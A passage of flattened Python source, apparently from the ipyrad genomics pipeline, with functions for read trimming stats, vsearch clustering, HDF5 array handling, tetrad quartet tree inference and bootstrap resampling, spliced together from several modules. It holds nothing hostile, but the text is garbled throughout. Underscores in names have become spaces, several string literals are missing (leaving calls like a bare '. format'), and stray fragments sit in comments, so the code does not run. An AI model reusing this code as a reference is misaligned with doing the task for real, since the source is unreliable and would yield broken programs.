( * self . params . thetaprior ) ) ctl . append ( "tauprior = {} {} {}" . format ( * self . params . tauprior ) ) ## other values, fixed for now ctl . append ( "finetune = 1: {}" . format ( " " . join ( [ str ( i ) for i in self . params . finetune ] ) ) ) #CTL.append("finetune = 1: 1 0.002 0.01 0.01 0.02 0.005 1.0") ctl . append ( "print = 1 0 0 0" ) ctl . append ( "burnin = {}" . format ( self . params . burnin ) ) ctl . append ( "sampfreq = {}" . format ( self . params . sampfreq ) ) ctl . append ( "nsample = {}" . format ( self . params . nsample ) ) ## write out the ctl file ctlhandle = os . path . realpath ( "{}.ctl.txt" . format ( os . path . join ( self . workdir , self . name ) ) ) # if isinstance(rep, int): #     ctlhandle = os.path.realpath( #         "{}-r{}.ctl.txt".format(os.path.join(self.workdir, self. name), rep)) # else: #     ctlhandle = os.path.realpath( #         "{}.ctl.txt".format(os.path.join(self.workdir, self. name))) with open ( ctlhandle , 'w' ) as out : out . write ( "\n" . join ( ctl ) ) return ctlhandle
def concatclusts ( outhandle , alignbits ) : with gzip . open ( outhandle , 'wb' ) as out : for fname in alignbits : with open ( fname ) as infile : out . write ( infile . read ( ) + "//\n//\n" )
def cluster ( data , noreverse , nthreads ) : ## input and output file handles cathaplos = os . path . join ( data . dirs . across , data . name + " catshuf.tmp" ) uhaplos = os . path . join ( data . dirs . across , data . name + ".utemp" ) hhaplos = os . path . join ( data . dirs . across , data . name + ".htemp" ) logfile = os . path . join ( data . dirs . across , "s6 cluster stats.txt" ) ## parameters that vary by datatype ## (too low of cov values yield too many poor alignments) strand = "plus" cov = 0.75 ##0.90 if data . paramsdict [ "datatype" ] in [ "gbs" , "2brad" ] : strand = "both" cov = 0.60 elif data . paramsdict [ "datatype" ] == "pairgbs" : strand = "both" cov = 0.75 ##0.90 ## nthreads is calculated in 'call cluster()' cmd = [ ipyrad . bins . vsearch , "-cluster smallmem" , cathaplos , "-strand" , strand , "-query cov" , str ( cov ) , "-minsl" , str ( 0.5 ) , "-id" , str ( data . paramsdict [ "clust threshold" ] ) , "-userout" , uhaplos , "-notmatched" , hhaplos , "-userfields" , "query+target+qstrand" , "-maxaccepts" , "1" , "-maxrejects" , "0" , "-fasta width" , "0" , "-threads" , str ( nthreads ) , #"0", "-fulldp" , "-usersort" , "-log" , logfile ] ## override reverse clustering option if noreverse : strand = "plus" # -leftjust " try : ## this seems to start vsearch on a different pid than the engine ## and so it's hard to kill...  LOGGER . info ( cmd ) ( dog , owner ) = pty . openpty ( ) proc = sps . Popen ( cmd , stdout = owner , stderr = owner , close fds = True ) prog = 0 newprog = 0 while 1 : isdat = select . select ( [ dog ] , [ ] , [ ] , 0 ) if isdat [ 0 ] : dat = os . read ( dog , 80192 ) else : dat = "" if "Clustering" in dat : try : newprog = int ( dat . split ( ) [ - 1 ] [ : - 1 ] ) ## may raise value error when it gets to the end except Value Error : pass ## break if done ## catches end chunk of printing if clustering went really fast elif "Clusters:" in dat : LOGGER . info ( "ended vsearch tracking loop" ) break else : time . sleep ( 0.1 ) ## print progress if newprog != prog : print ( newprog ) prog = newprog ## another catcher to let vsearch cleanup after clustering is done proc . wait ( ) print ( 100 ) except Keyboard Interrupt : LOGGER . info ( "interrupted vsearch here: %s" , proc . pid ) os . kill ( proc . pid , 2 ) raise Keyboard Interrupt ( ) except sps . Called Process Error as inst : raise I Pyrad Warning Exit ( . format ( inst , sps . STDOUT ) ) except OS Error as inst : raise I Pyrad Warning Exit ( . format ( inst ) ) finally : data . stats files . s6 = logfile
def fill dups arr ( data ) : ## build the duplicates array duplefiles = glob . glob ( os . path . join ( data . tmpdir , "duples *.tmp.npy" ) ) duplefiles . sort ( key = lambda x : int ( x . rsplit ( " " , 1 ) [ - 1 ] [ : - 8 ] ) ) ## enter the duplicates filter into super h5 array io5 = h5py . File ( data . clust database , 'r+' ) dfilter = io5 [ "duplicates" ] ## enter all duple arrays into full duplicates array init = 0 for dupf in duplefiles : end = int ( dupf . rsplit ( " " , 1 ) [ - 1 ] [ : - 8 ] ) inarr = np . load ( dupf ) dfilter [ init : end ] = inarr init += end - init #os.remove(dupf) #del inarr ## continued progress bar LOGGER . info ( "all duplicates: %s" , dfilter [ : ] . sum ( ) ) io5 . close ( )
def build tmp h5 ( data , samples ) : ## get samples and names, sorted snames = [ i . name for i in samples ] snames . sort ( ) ## Build an array for quickly indexing consens reads from catg files. ## save as a npy int binary file. uhandle = os . path . join ( data . dirs . across , data . name + ".utemp.sort" ) bseeds = os . path . join ( data . dirs . across , data . name + ".tmparrs.h5" ) ## send as first async1 job get seeds and hits ( uhandle , bseeds , snames )
def get nloci ( data ) : bseeds = os . path . join ( data . dirs . across , data . name + ".tmparrs.h5" ) with h5py . File ( bseeds ) as io5 : return io5 [ "seedsarr" ] . shape [ 0 ]
def write to fullarr ( data , sample , sidx ) : ## enter ref data? #isref = 'reference' in data.paramsdict["assembly method"] LOGGER . info ( "writing fullarr %s %s" , sample . name , sidx ) ## save big arrays to disk temporarily with h5py . File ( data . clust database , 'r+' ) as io5 : ## open views into the arrays we plan to fill chunk = io5 [ "catgs" ] . attrs [ "chunksize" ] [ 0 ] catg = io5 [ "catgs" ] nall = io5 [ "nalleles" ] ## adding an axis to newcatg makes it write about 1000X faster. smpio = os . path . join ( data . dirs . across , sample . name + '.tmp.h5' ) with h5py . File ( smpio ) as indat : ## grab all of the data from this sample's arrays newcatg = indat [ "icatg" ] #[:] onall = indat [ "inall" ] #[:] ## enter it into the full array one chunk at a time for cidx in xrange ( 0 , catg . shape [ 0 ] , chunk ) : end = cidx + chunk catg [ cidx : end , sidx : sidx + 1 , : ] = np . expand dims ( newcatg [ cidx : end , : ] , axis = 1 ) nall [ : , sidx : sidx + 1 ] = np . expand dims ( onall , axis = 1 )
def dask chroms ( data , samples ) : ## example concatenating with dask h5s = [ os . path . join ( data . dirs . across , s . name + ".tmp.h5" ) for s in samples ] handles = [ h5py . File ( i ) for i in h5s ] dsets = [ i [ '/ichrom' ] for i in handles ] arrays = [ da . from array ( dset , chunks = ( 10000 , 3 ) ) for dset in dsets ] stack = da . stack ( arrays , axis = 2 ) ## max chrom (should we check for variable hits? if so, things can get wonk) maxchrom = da . max ( stack , axis = 2 ) [ : , 0 ] ## max pos maxpos = da . max ( stack , axis = 2 ) [ : , 2 ] ## min pos mask = stack == 0 stack [ mask ] = 9223372036854775807 ## max int64 value minpos = da . min ( stack , axis = 2 ) [ : , 1 ] final = da . stack ( [ maxchrom , minpos , maxpos ] , axis = 1 ) final . to hdf5 ( data . clust database , "/chroms" ) ## close the h5 handles = [ i . close ( ) for i in handles ]
def inserted indels ( indels , ocatg ) : ## return copy with indels inserted newcatg = np . zeros ( ocatg . shape , dtype = np . uint32 ) ## iterate over loci and make extensions for indels for iloc in xrange ( ocatg . shape [ 0 ] ) : ## get indels indices indidx = np . where ( indels [ iloc , : ] ) [ 0 ] if np . any ( indidx ) : ## which new (empty) rows will be added allrows = np . arange ( ocatg . shape [ 1 ] ) mask = np . ones ( allrows . shape [ 0 ] , dtype = np . bool ) for idx in indidx : mask [ idx ] = False not idx = allrows [ mask == 1 ] ## fill in new data into all other spots newcatg [ iloc ] [ not idx ] = ocatg [ iloc , : not idx . shape [ 0 ] ] else : newcatg [ iloc ] = ocatg [ iloc ] return newcatg
def count seeds ( usort ) : with open ( usort , 'r' ) as insort : cmd1 = [ "cut" , "-f" , "2" ] cmd2 = [ "uniq" ] cmd3 = [ "wc" ] proc1 = sps . Popen ( cmd1 , stdin = insort , stdout = sps . PIPE , close fds = True ) proc2 = sps . Popen ( cmd2 , stdin = proc1 . stdout , stdout = sps . PIPE , close fds = True ) proc3 = sps . Popen ( cmd3 , stdin = proc2 . stdout , stdout = sps . PIPE , close fds = True ) res = proc3 . communicate ( ) nseeds = int ( res [ 0 ] . split ( ) [ 0 ] ) proc1 . stdout . close ( ) proc2 . stdout . close ( ) proc3 . stdout . close ( ) return nseeds
def sort seeds ( uhandle , usort ) : cmd = [ "sort" , "-k" , "2" , uhandle , "-o" , usort ] proc = sps . Popen ( cmd , close fds = True ) proc . communicate ( )
def assembly cleanup ( data ) : ## build s2 results data frame data . stats dfs . s2 = data . build stat ( "s2" ) data . stats files . s2 = os . path . join ( data . dirs . edits , 's2 rawedit stats.txt' ) ## write stats for all samples with io . open ( data . stats files . s2 , 'w' , encoding = 'utf-8' ) as outfile : data . stats dfs . s2 . fillna ( value = 0 ) . astype ( np . int ) . to string ( outfile )
def parse single results ( data , sample , res1 ) : ## set default values  #sample.stats dfs.s2["reads raw"] = 0 sample . stats dfs . s2 [ "trim adapter bp read1" ] = 0 sample . stats dfs . s2 [ "trim quality bp read1" ] = 0 sample . stats dfs . s2 [ "reads filtered by Ns" ] = 0 sample . stats dfs . s2 [ "reads filtered by minlen" ] = 0 sample . stats dfs . s2 [ "reads passed filter" ] = 0 ## parse new values from cutadapt results output lines = res1 . strip ( ) . split ( "\n" ) for line in lines : if "Total reads processed:" in line : value = int ( line . split ( ) [ 3 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "reads raw" ] = value if "Reads with adapters:" in line : value = int ( line . split ( ) [ 3 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "trim adapter bp read1" ] = value if "Quality-trimmed" in line : value = int ( line . split ( ) [ 1 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "trim quality bp read1" ] = value if "Reads that were too short" in line : value = int ( line . split ( ) [ 5 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "reads filtered by minlen" ] = value if "Reads with too many N" in line : value = int ( line . split ( ) [ 5 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "reads filtered by Ns" ] = value if "Reads written (passing filters):" in line : value = int ( line . split ( ) [ 4 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "reads passed filter" ] = value ## save to stats summary if sample . stats dfs . s2 . reads passed filter : sample . stats . state = 2 sample . stats . reads passed filter = sample . stats dfs . s2 . reads passed filter sample . files . edits = [ ( OPJ ( data . dirs . edits , sample . name + ".trimmed R1 .fastq.gz" ) , 0 ) ] ## write the long form output to the log file. LOGGER . info ( res1 ) else : print ( "{}No reads passed filtering in Sample: {}" . format ( data . spacer , sample . name ) )
def parse pair results ( data , sample , res ) : LOGGER . info ( "in parse pair mod results\n%s" , res ) ## set default values sample . stats dfs . s2 [ "trim adapter bp read1" ] = 0 sample . stats dfs . s2 [ "trim adapter bp read2" ] = 0 sample . stats dfs . s2 [ "trim quality bp read1" ] = 0 sample . stats dfs . s2 [ "trim quality bp read2" ] = 0 sample . stats dfs . s2 [ "reads filtered by Ns" ] = 0 sample . stats dfs . s2 [ "reads filtered by minlen" ] = 0 sample . stats dfs . s2 [ "reads passed filter" ] = 0 lines = res . strip ( ) . split ( "\n" ) qprimed = 0 for line in lines : ## set primer to catch next line if "Quality-trimmed" in line : qprimed = 1 ## grab read1 and read2 lines when qprimed if "Read 1:" in line : if qprimed : value = int ( line . split ( ) [ 2 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "trim quality bp read1" ] = value if "Read 2:" in line : if qprimed : value = int ( line . split ( ) [ 2 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "trim quality bp read2" ] = value qprimed = 0 if "Read 1 with adapter:" in line : value = int ( line . split ( ) [ 4 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "trim adapter bp read1" ] = value if "Read 2 with adapter:" in line : value = int ( line . split ( ) [ 4 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "trim adapter bp read2" ] = value if "Total read pairs processed:" in line : value = int ( line . split ( ) [ 4 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "reads raw" ] = value if "Pairs that were too short" in line : value = int ( line . split ( ) [ 5 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "reads filtered by minlen" ] = value if "Pairs with too many N" in line : value = int ( line . split ( ) [ 5 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "reads filtered by Ns" ] = value if "Pairs written (passing filters):" in line : value = int ( line . split ( ) [ 4 ] . replace ( "," , "" ) ) sample . stats dfs . s2 [ "reads passed filter" ] = value ## save to stats summary if sample . stats dfs . s2 . reads passed filter : sample . stats . state = 2 sample . stats . reads passed filter = sample . stats dfs . s2 . reads passed filter sample . files . edits = [ ( OPJ ( data . dirs . edits , sample . name + ".trimmed R1 .fastq.gz" ) , OPJ ( data . dirs . edits , sample . name + ".trimmed R2 .fastq.gz" ) ) ] else : print ( "No reads passed filtering in Sample: {}" . format ( sample . name ) )
def concat reads ( data , subsamples , ipyclient ) : ## concatenate reads if they come from merged assemblies. if any ( [ len ( i . files . fastqs ) > 1 for i in subsamples ] ) : ## run on single engine for now start = time . time ( ) printstr = " concatenating inputs  | {} | s2 |" finished = 0 catjobs = { } for sample in subsamples : if len ( sample . files . fastqs ) > 1 : catjobs [ sample . name ] = ipyclient [ 0 ] . apply ( concat multiple inputs , * ( data , sample ) ) else : sample . files . concat = sample . files . fastqs ## wait for all to finish while 1 : finished = sum ( [ i . ready ( ) for i in catjobs . values ( ) ] ) elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( len ( catjobs ) , finished , printstr . format ( elapsed ) , spacer = data . spacer ) time . sleep ( 0.1 ) if finished == len ( catjobs ) : print ( "" ) break ## collect results, which are concat file handles. for async in catjobs : if catjobs [ async ] . successful ( ) : data . samples [ async ] . files . concat = catjobs [ async ] . result ( ) else : error = catjobs [ async ] . result ( ) #exception() LOGGER . error ( "error in step2 concat %s" , error ) raise I Pyrad Warning Exit ( "error in step2 concat: {}" . format ( error ) ) else : for sample in subsamples : ## just copy fastqs handles to concat attribute sample . files . concat = sample . files . fastqs return subsamples
def run cutadapt ( data , subsamples , lbview ) : ## choose cutadapt function based on datatype start = time . time ( ) printstr = " processing reads      | {} | s2 |" finished = 0 rawedits = { } ## sort subsamples so that the biggest files get submitted first subsamples . sort ( key = lambda x : x . stats . reads raw , reverse = True ) LOGGER . info ( [ i . stats . reads raw for i in subsamples ] ) ## send samples to cutadapt filtering if "pair" in data . paramsdict [ "datatype" ] : for sample in subsamples : rawedits [ sample . name ] = lbview . apply ( cutadaptit pairs , * ( data , sample ) ) else : for sample in subsamples : rawedits [ sample . name ] = lbview . apply ( cutadaptit single , * ( data , sample ) ) ## wait for all to finish while 1 : finished = sum ( [ i . ready ( ) for i in rawedits . values ( ) ] ) elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( len ( rawedits ) , finished , printstr . format ( elapsed ) , spacer = data . spacer ) time . sleep ( 0.1 ) if finished == len ( rawedits ) : print ( "" ) break ## collect results, report failures, and store stats. async = sample.name for async in rawedits : if rawedits [ async ] . successful ( ) : res = rawedits [ async ] . result ( ) ## if single cleanup is easy if "pair" not in data . paramsdict [ "datatype" ] : parse single results ( data , data . samples [ async ] , res ) else : parse pair results ( data , data . samples [ async ] , res ) else : print ( "  found an error in step2; see ipyrad log.txt" ) LOGGER . error ( "error in run cutadapt(): %s" , rawedits [ async ] . exception ( ) )
def choose samples ( samples , force ) : ## hold samples that pass subsamples = [ ] ## filter the samples again if not force : for sample in samples : if sample . stats . state >= 2 : print ( . format ( sample . name ) ) elif not sample . stats . reads raw : print ( . format ( sample . name , sample . files . fastqs ) ) else : subsamples . append ( sample ) else : for sample in samples : if not sample . stats . reads raw : print ( . format ( sample . name , sample . files . fastqs ) ) else : subsamples . append ( sample ) return subsamples
def make ( data , samples ) : invcffile = os . path . join ( data . dirs . consens , data . name + ".vcf" ) outlocifile = os . path . join ( data . dirs . outfiles , data . name + ".loci" ) importvcf ( invcffile , outlocifile )
def compute tree stats ( self , ipyclient ) : ## get name indices names = self . samples ## get majority rule consensus tree of weighted Q bootstrap trees if self . params . nboots : ## Tree object fulltre = ete3 . Tree ( self . trees . tree , format = 0 ) fulltre . unroot ( ) ## only grab as many boots as the last option said was max with open ( self . trees . boots , 'r' ) as inboots : bb = [ ete3 . Tree ( i . strip ( ) , format = 0 ) for i in inboots . readlines ( ) ] wboots = [ fulltre ] + bb [ - self . params . nboots : ] ## infer consensus tree and write to file wctre , wcounts = consensus tree ( wboots , names = names ) self . trees . cons = os . path . join ( self . dirs , self . name + ".cons" ) with open ( self . trees . cons , 'w' ) as ocons : ocons . write ( wctre . write ( format = 0 ) ) else : wctre = ete3 . Tree ( self . trees . tree , format = 0 ) wctre . unroot ( ) ## build stats file and write trees self . trees . nhx = os . path . join ( self . dirs , self . name + ".nhx" ) with open ( self . files . stats , 'w' ) as ostats : ## print Tetrad info #ostats.write(STATS STRING.format(**self.stats)) ## print bootstrap splits if self . params . nboots : ostats . write ( "## splits observed in {} trees\n" . format ( len ( wboots ) ) ) for i , j in enumerate ( self . samples ) : ostats . write ( "{:<3} {}\n" . format ( i , j ) ) ostats . write ( "\n" ) for split , freq in wcounts : if split . count ( '1' ) > 1 : ostats . write ( "{}   {:.2f}\n" . format ( split , round ( freq , 2 ) ) ) ostats . write ( "\n" ) ## parallelized this function because it can be slogging lbview = ipyclient . load balanced view ( ) ## store results in dicts qtots = { } qsamp = { } tots = sum ( 1 for i in wctre . iter leaves ( ) ) totn = set ( wctre . get leaf names ( ) ) ## iterate over node traversal.  for node in wctre . traverse ( ) : ## this is slow, needs to look at every sampled quartet ## so we send it be processed on an engine qtots [ node ] = lbview . apply ( get total , * ( tots , node ) ) qsamp [ node ] = lbview . apply ( get sampled , * ( self , totn , node ) ) ## wait for jobs to finish ipyclient . wait ( ) ## put results into tree for node in wctre . traverse ( ) : ## this is fast, just calcs n choose k total = qtots [ node ] . result ( ) sampled = qsamp [ node ] . result ( ) ## store the results to the tree             node . add feature ( "quartets total" , total ) node . add feature ( "quartets sampled" , sampled ) features = [ "quartets total" , "quartets sampled" ] ## return as NHX format with extra info with open ( self . trees . nhx , 'w' ) as outtre : outtre . write ( wctre . write ( format = 0 , features = features ) )
def random product ( iter1 , iter2 ) : pool1 = tuple ( iter1 ) pool2 = tuple ( iter2 ) ind1 = random . sample ( pool1 , 2 ) ind2 = random . sample ( pool2 , 2 ) return tuple ( ind1 + ind2 )
def count snps ( mat ) : ## get [aabb, baba, abba, aaab]  snps = np . zeros ( 4 , dtype = np . uint32 ) ## get concordant (aabb) pis sites snps [ 0 ] = np . uint32 ( mat [ 0 , 5 ] + mat [ 0 , 10 ] + mat [ 0 , 15 ] + mat [ 5 , 0 ] + mat [ 5 , 10 ] + mat [ 5 , 15 ] + mat [ 10 , 0 ] + mat [ 10 , 5 ] + mat [ 10 , 15 ] + mat [ 15 , 0 ] + mat [ 15 , 5 ] + mat [ 15 , 10 ] ) ## get discordant (baba) sites for i in range ( 16 ) : if i % 5 : snps [ 1 ] += mat [ i , i ] ## get discordant (abba) sites snps [ 2 ] = mat [ 1 , 4 ] + mat [ 2 , 8 ] + mat [ 3 , 12 ] + mat [ 4 , 1 ] + mat [ 6 , 9 ] + mat [ 7 , 13 ] + mat [ 8 , 2 ] + mat [ 9 , 6 ] + mat [ 11 , 14 ] + mat [ 12 , 3 ] + mat [ 13 , 7 ] + mat [ 14 , 11 ] ## get autapomorphy sites snps [ 3 ] = ( mat . sum ( ) - np . diag ( mat ) . sum ( ) ) - snps [ 2 ] return snps
def calculate ( seqnon , mapcol , nmask , tests ) : ## create empty matrices #LOGGER.info("tests[0] %s", tests[0]) #LOGGER.info('seqnon[[tests[0]]] %s', seqnon[[tests[0]]]) mats = chunk to matrices ( seqnon , mapcol , nmask ) ## empty svdscores for each arrangement of seqchunk svds = np . zeros ( ( 3 , 16 ) , dtype = np . float64 ) qscores = np . zeros ( 3 , dtype = np . float64 ) ranks = np . zeros ( 3 , dtype = np . float64 ) for test in range ( 3 ) : ## get svd scores svds [ test ] = np . linalg . svd ( mats [ test ] . astype ( np . float64 ) ) [ 1 ] ranks [ test ] = np . linalg . matrix rank ( mats [ test ] . astype ( np . float64 ) ) ## get minrank, or 11 minrank = int ( min ( 11 , ranks . min ( ) ) ) for test in range ( 3 ) : qscores [ test ] = np . sqrt ( np . sum ( svds [ test , minrank : ] ** 2 ) ) ## sort to find the best qorder best = np . where ( qscores == qscores . min ( ) ) [ 0 ] #best = qscores[qscores == qscores.min()][0] bidx = tests [ best ] [ 0 ] qsnps = count snps ( mats [ best ] [ 0 ] ) return bidx , qsnps
def nworker ( data , smpchunk , tests ) : ## tell engines to limit threads #numba.config.NUMBA DEFAULT NUM THREADS = 1 ## open the seqarray view, the modified array is in bootsarr with h5py . File ( data . database . input , 'r' ) as io5 : seqview = io5 [ "bootsarr" ] [ : ] maparr = io5 [ "bootsmap" ] [ : ] ## create an N-mask array of all seq cols (this isn't really too slow) nall mask = seqview [ : ] == 78 ## tried numba compiling everythign below here, but was not faster ## than making nmask w/ axis arg in numpy ## get the input arrays ready rquartets = np . zeros ( ( smpchunk . shape [ 0 ] , 4 ) , dtype = np . uint16 ) rweights = None #rweights = np.ones(smpchunk.shape[0], dtype=np.float64) rdstats = np . zeros ( ( smpchunk . shape [ 0 ] , 4 ) , dtype = np . uint32 ) #times = [] ## fill arrays with results using numba funcs for idx in xrange ( smpchunk . shape [ 0 ] ) : ## get seqchunk for 4 samples (4, ncols)  sidx = smpchunk [ idx ] seqchunk = seqview [ sidx ] ## get N-containing columns in 4-array, and invariant sites. nmask = np . any ( nall mask [ sidx ] , axis = 0 ) nmask += np . all ( seqchunk == seqchunk [ 0 ] , axis = 0 ) ## <- do we need this? ## get matrices if there are any shared SN Ps ## returns best-tree index, qscores, and qstats #bidx, qscores, qstats = calculate(seqchunk, maparr[:, 0], nmask, tests) bidx , qstats = calculate ( seqchunk , maparr [ : , 0 ] , nmask , tests ) ## get weights from the three scores sorted.  ## Only save to file if the quartet has information rdstats [ idx ] = qstats rquartets [ idx ] = smpchunk [ idx ] [ bidx ] return rquartets , rweights , rdstats
def shuffle cols ( seqarr , newarr , cols ) : for idx in xrange ( cols . shape [ 0 ] ) : newarr [ : , idx ] = seqarr [ : , cols [ idx ] ] return newarr
def resolve ambigs ( tmpseq ) : ## iterate over the bases 'RSKWYM': [82, 83, 75, 87, 89, 77] for ambig in np . uint8 ( [ 82 , 83 , 75 , 87 , 89 , 77 ] ) : ## get all site in this ambig idx , idy = np . where ( tmpseq == ambig ) ## get the two resolutions of the ambig res1 , res2 = AMBIGS [ ambig . view ( "S1" ) ] ## randomly sample half those sites halfmask = np . random . choice ( [ True , False ] , idx . shape [ 0 ] ) ## replace ambig bases with their resolutions for i in xrange ( halfmask . shape [ 0 ] ) : if halfmask [ i ] : tmpseq [ idx [ i ] , idy [ i ] ] = np . array ( res1 ) . view ( np . uint8 ) else : tmpseq [ idx [ i ] , idy [ i ] ] = np . array ( res2 ) . view ( np . uint8 ) return tmpseq
def get spans ( maparr , spans ) : ## start at 0, finds change at 1-index of map file bidx = 1 spans = np . zeros ( ( maparr [ - 1 , 0 ] , 2 ) , np . uint64 ) ## read through marr and record when locus id changes for idx in xrange ( 1 , maparr . shape [ 0 ] ) : cur = maparr [ idx , 0 ] if cur != bidx : idy = idx + 1 spans [ cur - 2 , 1 ] = idx spans [ cur - 1 , 0 ] = idx bidx = cur spans [ - 1 , 1 ] = maparr [ - 1 , - 1 ] return spans
def get shape ( spans , loci ) : width = 0 for idx in xrange ( loci . shape [ 0 ] ) : width += spans [ loci [ idx ] , 1 ] - spans [ loci [ idx ] , 0 ] return width
def fill boot ( seqarr , newboot , newmap , spans , loci ) : ## column index cidx = 0 ## resample each locus for i in xrange ( loci . shape [ 0 ] ) : ## grab a random locus's columns x1 = spans [ loci [ i ] ] [ 0 ] x2 = spans [ loci [ i ] ] [ 1 ] cols = seqarr [ : , x1 : x2 ] ## randomize columns within colsq cord = np . random . choice ( cols . shape [ 1 ] , cols . shape [ 1 ] , replace = False ) rcols = cols [ : , cord ] ## fill bootarr with n columns from seqarr ## the required length was already measured newboot [ : , cidx : cidx + cols . shape [ 1 ] ] = rcols ## fill bootmap with new map info newmap [ cidx : cidx + cols . shape [ 1 ] , 0 ] = i + 1 ## advance column index cidx += cols . shape [ 1 ] ## return the concatenated cols return newboot , newmap
def byteify ( data , ignore dicts = False ) : if isinstance ( data , unicode ) : return data . encode ( "utf-8" ) if isinstance ( data , list ) : return [ byteify ( item , ignore dicts = True ) for item in data ] if isinstance ( data , dict ) and not ignore dicts : return { byteify ( key , ignore dicts = True ) : byteify ( value , ignore dicts = True ) for key , value in data . iteritems ( ) } return data
def parse names ( self ) : self . samples = [ ] with iter ( open ( self . files . data , 'r' ) ) as infile : infile . next ( ) . strip ( ) . split ( ) while 1 : try : self . samples . append ( infile . next ( ) . split ( ) [ 0 ] ) except Stop Iteration : break
def run qmc ( self , boot ) : ## convert to txt file for w QMC self . tmp = os . path . join ( self . dirs , ".tmpwtre" ) cmd = [ ip . bins . qmc , "qrtt=" + self . files . qdump , "otre=" + self . tmp ] ## run them proc = subprocess . Popen ( cmd , stderr = subprocess . STDOUT , stdout = subprocess . PIPE ) res = proc . communicate ( ) if proc . returncode : #LOGGER.error("Error in QMC: \n({}).".format(res)) LOGGER . error ( res ) raise I Pyrad Warning Exit ( res [ 1 ] ) ## read in the tmp files since qmc does not pipe with open ( self . tmp ) as intree : ## convert int names back to str names renamer returns a newick str #tmp = toytree.tree(intree.read().strip()) tmp = ete3 . Tree ( intree . read ( ) . strip ( ) ) tmpwtre = self . renamer ( tmp ) #.tree) ## save the tree if boot : self . trees . boots = os . path . join ( self . dirs , self . name + ".boots" ) with open ( self . trees . boots , 'a' ) as outboot : outboot . write ( tmpwtre + "\n" ) else : self . trees . tree = os . path . join ( self . dirs , self . name + ".tree" ) with open ( self . trees . tree , 'w' ) as outtree : outtree . write ( tmpwtre ) ## save JSON file checkpoint self . save ( )
def renamer ( self , tre ) : ## get the tre with numbered tree tip labels names = tre . get leaves ( ) ## replace numbered names with snames for name in names : name . name = self . samples [ int ( name . name ) ] ## return with only topology and leaf labels return tre . write ( format = 9 )
def finalize stats ( self , ipyclient ) : ## print stats file location: #print(STATSOUT.format(opr(self.files.stats))) ## print finished tree information --------------------- print ( FINALTREES . format ( opr ( self . trees . tree ) ) ) ## print bootstrap information -------------------------- if self . params . nboots : ## get consensus, map values to tree edges, record stats file self . compute tree stats ( ipyclient ) ## print bootstrap info print ( BOOTTREES . format ( opr ( self . trees . cons ) , opr ( self . trees . boots ) ) ) ## print the ASCII tree only if its small if len ( self . samples ) < 20 : if self . params . nboots : wctre = ete3 . Tree ( self . trees . cons , format = 0 ) wctre . ladderize ( ) print ( wctre . get ascii ( show internal = True , attributes = [ "dist" , "name" ] ) ) print ( "" ) else : qtre = ete3 . Tree ( self . trees . tree , format = 0 ) qtre . ladderize ( ) #qtre = toytree.tree(self.trees.tree, format=0) #qtre.tree.unroot() print ( qtre . get ascii ( ) ) print ( "" ) ## print PDF filename & tips ----------------------------- docslink = "https://toytree.readthedocs.io/" citelink = "https://ipyrad.readthedocs.io/tetrad.html" print ( LINKS . format ( docslink , citelink ) )
def save ( self ) : ## save each attribute as dict fulldict = copy . deepcopy ( self . dict ) for i , j in fulldict . items ( ) : if isinstance ( j , Params ) : fulldict [ i ] = j . dict fulldumps = json . dumps ( fulldict , sort keys = False , indent = 4 , separators = ( "," , ":" ) , ) ## save to file, make dir if it wasn't made earlier assemblypath = os . path . join ( self . dirs , self . name + ".tet.json" ) if not os . path . exists ( self . dirs ) : os . mkdir ( self . dirs ) ## protect save from interruption done = 0 while not done : try : with open ( assemblypath , 'w' ) as jout : jout . write ( fulldumps ) done = 1 except ( Keyboard Interrupt , System Exit ) : print ( '.' ) continue
def insert to array ( self , start , results ) : qrts , wgts , qsts = results #qrts, wgts = results #print(qrts) with h5py . File ( self . database . output , 'r+' ) as out : chunk = self . chunksize out [ 'quartets' ] [ start : start + chunk ] = qrts ##out['weights'][start:start+chunk] = wgts ## entered as 0-indexed ! if self . checkpoint . boots : key = "qboots/b{}" . format ( self . checkpoint . boots - 1 ) out [ key ] [ start : start + chunk ] = qsts else : out [ "qstats" ] [ start : start + chunk ] = qsts
def make stats ( data , samples , samplecounts , locuscounts ) : ## get meta info with h5py . File ( data . clust database , 'r' ) as io5 : anames = io5 [ "seqs" ] . attrs [ "samples" ] nloci = io5 [ "seqs" ] . shape [ 0 ] optim = io5 [ "seqs" ] . attrs [ "chunksize" ] [ 0 ] ## open the out handle. This will have three data frames saved to it. ## locus filtering, sample coverages, and snp distributions data . stats files . s7 = os . path . join ( data . dirs . outfiles , data . name + " stats.txt" ) outstats = io . open ( data . stats files . s7 , 'w' , encoding = "utf-8" ) ######################################################################## ## get stats for locus filtering, use chunking. filters = np . zeros ( 6 , dtype = int ) passed = 0 start = 0 piscounts = Counter ( ) varcounts = Counter ( ) for i in range ( 200 ) : piscounts [ i ] = 0 varcounts [ i ] = 0 applied = pd . Series ( [ 0 ] * 8 , name = "applied order" , index = [ "total prefiltered loci" , "filtered by rm duplicates" , "filtered by max indels" , "filtered by max snps" , "filtered by max shared het" , "filtered by min sample" , "filtered by max alleles" , "total filtered loci" ] ) ## load the h5 database co5 = h5py . File ( data . database , 'r' ) while start < nloci : hslice = [ start , start + optim ] ## load each array afilt = co5 [ "filters" ] [ hslice [ 0 ] : hslice [ 1 ] , ] asnps = co5 [ "snps" ] [ hslice [ 0 ] : hslice [ 1 ] , ] ## get subarray results from filter array # max indels, max snps, max hets, min samps, bad edges, max alleles filters += afilt . sum ( axis = 0 ) applied [ "filtered by rm duplicates" ] += afilt [ : , 0 ] . sum ( ) mask = afilt [ : , 0 ] . astype ( np . bool ) applied [ "filtered by max indels" ] += afilt [ ~ mask , 1 ] . sum ( ) mask = afilt [ : , 0 : 2 ] . sum ( axis = 1 ) . astype ( np . bool ) applied [ "filtered by max snps" ] += afilt [ ~ mask 